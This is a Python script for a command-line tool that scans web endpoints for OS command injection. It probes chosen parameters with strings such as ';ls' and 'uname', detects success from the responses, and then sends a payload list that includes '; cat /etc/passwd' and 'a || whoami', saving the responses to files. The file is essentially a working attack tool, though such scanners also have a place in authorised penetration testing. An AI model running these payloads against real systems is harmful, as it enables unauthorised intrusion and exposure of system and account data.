import click
import requests
from utils import get_time
from bcolors import bcolors

PAYLOADS=[
    'pippo',
    '; cat /etc/passwd',
    'randomfile.txt; ls',
    'a || whoami',
    'ls',
    'ls -l',
    'ls -a',
    ';ls -a',
    'a || ls -a',
]

URLS=[]

@click.command()
@click.option('--target', '--t', required=True, help='A target host (e.g., http://localhost)')
@click.option('--urls', '--u', required=True, multiple=True, help='A list of URLs to scan')
@click.option('--methods', '--m', required=True, type=click.Choice(['GET', 'POST'], case_sensitive=True), multiple=True, 
    help='A list of methods for each URL')
@click.option('--params', '--p', required=True, multiple=True, 
    help='A list of parameters for each URL You can use any input format you want')
def main(target, urls, methods, params):
    
    format_requests(target, urls)

    for idx, method in enumerate(methods):
        print(f'[{bcolors.OKBLUE}{get_time()}{bcolors.ENDC}] [{bcolors.HEADER}INFO{bcolors.ENDC}] Checking if {URLS[idx]} is injectable...')
        inj = is_injectable(idx, params, urls)
        if not inj[0]:
            print(f'[{bcolors.OKBLUE}{get_time()}{bcolors.ENDC}] [{bcolors.FAIL}FAILURE{bcolors.ENDC}] {URLS[idx]} seems not injectable.')
            return

        print(f'{bcolors.BOLD}[{bcolors.OKBLUE}{get_time()}{bcolors.ENDC}]{bcolors.BOLD} [{bcolors.OKGREEN}SUCCESS{bcolors.ENDC}]{bcolors.BOLD} I found a command injection on the \'{params[0]}\' parameter of the \'{URLS[idx]}\' URL, using the \'{inj[1]}\' payload{bcolors.ENDC}')
        print(f'[{bcolors.OKBLUE}{get_time()}{bcolors.ENDC}] [{bcolors.OKGREEN}SUCCESS{bcolors.ENDC}] Preparing payloads...')
        payloads = prepare_payload(params, idx)
        print(f'[{bcolors.OKBLUE}{get_time()}{bcolors.ENDC}] [{bcolors.OKGREEN}SUCCESS{bcolors.ENDC}] Payloads prepared!')
        print(f'[{bcolors.OKBLUE}{get_time()}{bcolors.ENDC}] [{bcolors.OKGREEN}SUCCESS{bcolors.ENDC}] Serving payloads...')
        print(f'[{bcolors.OKBLUE}{get_time()}{bcolors.ENDC}] [{bcolors.OKGREEN}SUCCESS{bcolors.ENDC}] Writing result in an output file...')
        for payload in payloads:
            req = ''
            if method == 'GET':
                req = requests.get(URLS[idx], params=payload) 
            elif method == 'POST':
                req = requests.post(URLS[idx], data=payload)
            f = open(f'{urls[idx]}-output.txt', 'a')
            f.write(f'{req.text}')
            f.close()

def is_injectable(idx, params, urls):
    cmds = [
        'echo injected > cmd_inj.txt | find . -name cmd_inj.txt', 
        ';ls -a',
        f'{urls[idx]}',
        ';ls',
        'uname',
        ';uname',
    ]
    param_list = get_params(idx, params)
    for param in param_list:
        for cmd in cmds:
            payload = {param: cmd}
            req = requests.get(URLS[idx], params=payload)

            #print(req.url)
            #print(cmd)
            #print(req.text)

            if '.' in req.text and '..' in req.text:
                return (True, cmd)
            
            if f'./{cmd}' in req.text:
                return (True, cmd)

            if 'Linux' in req.text:
                return (True, cmd)

    return (False, "")

def prepare_payload(parameters, idx):
    payloads = []
    params = get_params(idx, parameters)
    for payload in PAYLOADS:
        payload_dict = {}
        for param in params:
            payload_dict[param]=payload
        payloads.append(payload_dict)
    return payloads

def format_requests(target, urls):
    for url in urls:
        URLS.append(f"{target}/{url}")

def get_params(idx, params):
    return params[idx].split(':')

if __name__ == '__main__':
    main()
